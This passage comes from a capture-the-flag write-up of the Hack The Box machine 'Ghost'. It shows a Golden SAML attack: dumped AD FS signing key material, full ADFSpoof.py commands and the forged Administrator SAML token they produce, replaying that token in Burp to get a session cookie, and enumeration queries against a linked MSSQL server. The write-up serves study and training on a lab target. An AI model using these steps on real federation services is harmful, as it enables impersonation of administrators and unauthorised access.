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
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>

    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);

```

#### Format Data

To run `ADFSpoof.py`, I need the following both the token signing key and private key. There are two private keys. I’ll grab both both the first one is the one that works. I’ll need to convert these to binary. The private key needs to have the dashes removed and hex converted back to binary:

```

oxdf@hacky$ echo "8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1" | tr -d "-" | xxd -r -p | tee private_key.bin | xxd
00000000: 8dac a490 702b 3fd6 08d5 bc35 a984 8756  ....p+?....5...V
00000010: d2fa 3b7b 7413 a3c6 2c58 a6f4 58fb 9da1  ..;{t...,X..X...

```

The token signing key just needs base64-decoding:

```

oxdf@hacky$ echo "AAAAAQAAAA...[snip]...N/BEsNEUSTXxm" | base64 -d > encrypted_token_siging_key.bin

```

#### Spoof SAML

`ADFSpoof.py` takes in arguments in a confusing way. The structure of the command is `python ADFSpoof.py [global arguments] <module> [module arguments]`.

I’ll need the following global arguments:
- `-b encrypted_token_siging_key.bin private_key.bin` - the key material.
- `-s core.ghost.htb` - the target domain.

The module is `saml2`, which then gets these arguments:
- `--endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse` - the endpoint that the data is going to.
- `--nameidformat ...` - the format of the name, which I’ll use `emailAddress` with from the list [here](https://docs.oracle.com/cd/E19316-01/820-3886/ggwbz/index.html).
- `--nameid Administrator@ghost.htb` - the email address to spoof.
- `--rpidentifier 'https://core.ghost.htb:8443'` - the relying party
- `--assertions ...` - the claims that say this user is the administrator, based on the decoded response above.

Putting this all together generates:

```

oxdf@hacky$ python ADFSpoof.py -b ~/hackthebox/ghost-10.10.11.24/encrypted_token_siging_key.bin ~/hackthebox/ghost-10.10.11.24/private_key.bin -s 'core.ghost.htb' saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfS0VFM1lBIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMy0zMVQxNTo1MToxOS4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfQ0VNMjlYIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDMtMzFUMTU6NTE6MTkuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0NFTTI5WCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPi9JRWRvQkU3ZkJKMjVJQmVzSzJiL2FWRnFVeGdpSHNhZWF4VzBVK2E1L3c9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPmtxTzZnamVvaHFYYW1hMzFrMHJQMGJxNVdNYjlvaENjbTVjU04wVi85VGpJVGYvS1l0WE9SQ1dvOURueDBLNXk2ZzdrS3RtZno4NXNTR21tZmRVSVJCVlFQTG9maHkyRXlyS21YQTYxUkIvRGVXeXRCUitGNFU0SFdTU1REQUdLRWdJckNsL3QxQVp4Z1JRODIreUp6V29ibGZwZGNsdUlyTExXZy9xbTZROXQ0REJFdlRFYlNVWnVwbkxTMFh5aTFUSFZkKzFhVlJJYndJVC94S2FveXhMeDJkcG0ra2VwQm5VZ0g2RzdJT0ZwQUxaMVhyeXZRRTZqQmpwZnoxbHdyTHYybGt6NTg4M202ZllobmdkNDlkY0ZMbVFpUmJDSUVOdnVGYmZSLzZUZXM4SFNUem5FRXBvM1U1cG15YjVXZDF0dHEyeTA0c1FtSHBPQUNXbnlDZ0lRMnAvSGU1dmp4OU1RSThGbUwvbEIrdmE5Zm52VFo5VjhtTlZreUdwWm44amZkRVgrMXM3TlFlczcwSysrWGZWcFlNOWM5ZDc4NmwwNWp5K0ZnaVhjMm1waUg4OVFQNkNhc2RZdW8vSThiRG1NZTVGc25jSWh5cEl2bEl1MlhGWlRqSDlRVFNDSTdFa2JsdVBTQzl6RnFUVWdkVWdqY0RicVJTdUNYSXF1STF0WVdsYjYxRU9EOVNVSkh1Vm9wWGVwc1E1VHZTZWQ2UlNwWllFbzBUSGMyeHFBTmhWSW9LOVpsZDJyYlAwSnErK1didCttRytKSXNOamFsb0o2M0kwSXZseVIvN2xCdXM4KzhNRGhya28wYk9Gbm10R1dLbVR4cWh2YVIwNHFPYkNDWVYwL2E5TnprMU9Ea0RkT2FUZHE2MnFNNmg0ZWptVUpiWFhuelNRPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSVBMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjUtMDMtMzFUMTU6NTY6MTkuMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTAzLTMxVDE1OjUxOjE5LjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0wMy0zMVQxNjo1MToxOS4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5BZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%2BPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjUtMDMtMzFUMTU6NTE6MTguNTAwWiIgU2Vzc2lvbkluZGV4PSJfQ0VNMjlYIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D

```

I did have to install these requirements using Python3.11, as the packages are relatively old and they break in 3.12.

#### Get Cookie

I’ll go to Burp Proxy and find a POST request to `/adfs/saml/postResponse`, sending it to Burp Repeater. I’ll replace the POST body with the forged SAML response, and send. It returns with a new cookie:

![image-20250331115635883](/img/image-20250331115635883.png)

I’ll put that cookie into my browser and refresh `/` and it loads:

![image-20250331115658408](/img/image-20250331115658408.png)

It is equally good to use interception in Burp Proxy and edit the payload in there as well.

### Database Execution

#### Enumeration

This page seems to be an overlay to run queries in the database. In the text there’s a new domain, `corp.ghost.htb`.

Running `select CURRENT_USER;` shows user connected to the database is web\_client:

![image-20250331120144611](/img/image-20250331120144611.png)

The text says the DBs are linked. I can verify the two servers this with `sp_linkedservers`:

![image-20250331120547641](/img/image-20250331120547641.png)

`OPENQUERY` is the function to run queries on the linked server. This query will get the user running across the link: `SELECT * from OPENQUERY("PRIMARY", 'select CURRENT_USER as result')` .

![image-20250331121148293](/img/image-20250331121148293.png)

ChatGPT helped me make this query to look for users with `IMPERSONATE` privileges:

```

SELECT grantor.name AS Grantor, 
       grantee.name AS Grantee, 
       impersonated.name AS ImpersonatedLogin
FROM sys.server_permissions AS perm
JOIN sys.server_principals AS grantee 
    ON perm.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals AS impersonated 
    ON perm.major_id = impersonated.principal_id
JOIN sys.server_principals AS grantor 
    ON perm.grantor_principal_id = grantor.principal_id
WHERE perm.permission_name = 'IMPERSONATE';

```

It finds nothing:

![image-20250331121632999](/img/image-20250331121632999.png)

If I use `OPENQUERY` to run this same query on `PRIMARY`:

```

SELECT * FROM OPENQUERY("PRIMARY", '
    SELECT grantor.name AS Grantor,
           grantee.name AS Grantee,
           impersonated.name AS ImpersonatedLogin
    FROM sys.server_permissions AS perm
    JOIN sys.server_principals AS grantee
        ON perm.grantee_principal_id = grantee.principal_id
    JOIN sys.server_principals AS impersonated
